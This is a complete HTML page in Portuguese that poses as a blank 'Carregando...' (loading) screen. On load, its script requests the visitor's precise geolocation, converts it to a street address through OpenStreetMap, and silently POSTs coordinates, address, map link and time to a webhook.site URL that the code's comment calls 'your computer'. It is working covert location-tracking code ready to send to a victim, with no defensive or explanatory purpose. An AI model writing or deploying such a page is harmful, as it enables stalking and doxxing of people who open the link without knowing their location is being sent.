<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando...</title>
    <style>
        body { background-color: #ffffff; margin: 0; padding: 0; }
    </style>
</head>
<body>
    <script>
        const URL_DO_WEBHOOK = "https://webhook.site/b2865f9e-7dce-463e-ba3d-13e739fa2ea6"; 

        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(processarLocalizacao, showError, {
                    enableHighAccuracy: true
                });
            }
        };

        function processarLocalizacao(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const precisao = position.coords.accuracy;

            // Consulta a API gratuita do OpenStreetMap para traduzir as coordenadas
            const urlGeocoding = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`;

            fetch(urlGeocoding)
                .then(resposta => resposta.json())
                .then(dadosGeocoding => {
                    const endereco = dadosGeocoding.address || {};
                    
                    // Monta o pacote final com coordenadas e endereço por extenso
                    const pacote = {
                        latitude: lat,
                        longitude: lon,
                        margem_erro_metros: precisao.toFixed(2),
                        rua: endereco.road || "Não identificada",
                        numero: endereco.house_number || "Sem número no mapa",
                        bairro: endereco.suburb || endereco.neighbourhood || "Não identificado",
                        cidade: endereco.city || endereco.town || endereco.village || "Não identificada",
                        estado: endereco.state || "Não identificado",
                        cep: endereco.postcode || "Não identificado",
                        link_maps: `https://www.google.com/maps?q=${lat},${lon}`,
                        horario: new Date().toLocaleString()
                    };

                    // Envia tudo para o seu computador (Webhook)
                    return fetch(URL_DO_WEBHOOK, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(pacote)
                    });
                })
                .catch(error => console.error("Erro:", error));
        }

        function showError(error) {
            console.error("Falha ao obter localização:", error);
        }
    </script>
</body>
</html>
